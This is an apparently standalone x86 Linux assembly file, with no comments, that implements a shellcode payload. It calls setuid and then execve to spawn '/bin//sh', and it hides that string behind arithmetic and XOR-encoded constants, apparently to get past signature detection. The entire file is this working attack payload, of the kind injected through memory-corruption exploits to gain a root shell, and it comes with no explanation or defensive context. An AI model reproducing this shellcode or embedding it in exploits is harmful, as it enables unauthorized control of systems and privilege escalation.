section .text
	global _start

_start:

    push 0x17
    pop eax
    int 0x80
    mov bl, 0x4
    mov cl, 0x7
    add ecx, ebx
    mov al, cl
    sub ecx, ecx
    push ecx
    mov edi, 0x26082608
    mov esi, 0x426b0927 
    add esi, edi
    push esi
    mov esi,0x48614427
    xor esi, edi
    push esi
    mov ebx,esp
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
